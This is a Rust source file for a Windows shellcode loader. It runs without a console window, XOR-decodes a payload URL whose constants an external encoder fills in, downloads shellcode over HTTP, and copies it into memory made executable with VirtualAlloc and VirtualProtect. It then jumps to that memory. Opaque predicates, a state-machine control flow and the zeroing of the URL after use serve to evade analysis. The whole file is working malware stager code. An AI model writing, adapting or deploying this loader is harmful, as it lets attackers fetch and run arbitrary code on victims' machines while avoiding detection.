#![windows_subsystem = "windows"]
use std::ptr;
use reqwest;
use windows_sys::Win32::System::Memory::{
    VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
};
//>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>| Just edit the constants in between the tags generated by encoder. :)
// ENCODER:BEGIN
const URL_KEY: u8 = 0x5A;
const URL_CIPHER: [u8; 0] = [];
// ENCODER:END
//>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>| *********************************************************************
fn decode_url() -> String {
    let mut buf = URL_CIPHER;
    for b in buf.iter_mut() {
        *b ^= URL_KEY;
    }
    let s = String::from_utf8(buf.to_vec()).expect("utf8");
    for b in buf.iter_mut() {
        *b = 0;
    }
    s
}

fn download_payload(url: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let response = reqwest::blocking::get(url)?;
    if !response.status().is_success() {
        return Err(format!("Server returned HTTP {}", response.status()).into());
    }
    let bytes = response.bytes()?;
    Ok(bytes.to_vec())
}

#[derive(Clone, Copy)]
enum State {
    Downloaded,
    Allocated,
    Copied,
    Protected,
    Done,
    Fail,
}

#[inline(never)]
fn opaque_true(x: usize) -> bool {
    (x & 0) == 0
}

fn main() -> Result<(), Box<dyn std::error::Error>> {

    let url = decode_url();
    let shellcode = download_payload(&url)?;

    let mut u = url.into_bytes();
    for b in u.iter_mut() {
        *b = 0;
    }
    drop(u);

    let shellcode_size = shellcode.len();

    unsafe {

        let mut state = State::Downloaded;
        let mut mem: *mut u8 = ptr::null_mut();
        let mut old_protect = 0u32;

        loop {
            match state {
                State::Downloaded => {
                    state = if opaque_true(shellcode_size) {
                        State::Allocated
                    } else {
                        State::Fail
                    };
                }

                State::Allocated => {
                    mem = VirtualAlloc(
                        ptr::null_mut(),
                        shellcode_size,
                        MEM_COMMIT | MEM_RESERVE,
                        PAGE_READWRITE,
                    ) as *mut u8;
                    state = if !mem.is_null() && opaque_true(0x1337) {
                        State::Copied
                    } else {
                        State::Fail
                    };
                }

                State::Copied => {
                    ptr::copy_nonoverlapping(shellcode.as_ptr(), mem, shellcode_size);
                    state = if opaque_true(0x2B) {
                        State::Protected
                    } else {
                        State::Fail
                    };
                }
                
                State::Protected => {
                    let ok = VirtualProtect(
                        mem as *mut _,
                        shellcode_size,
                        PAGE_EXECUTE_READ,
                        &mut old_protect,
                    );
                    state = if ok != 0 && opaque_true(0x7) {
                        State::Done
                    } else {
                        State::Fail
                    };
                }

                State::Done => {
                    let func: extern "system" fn() -> u32 = std::mem::transmute(mem);
                    func();
                    return Ok(());
                }

                State::Fail => {
                    return Err("loader failed".into());
                }
            }
        }
    }
}
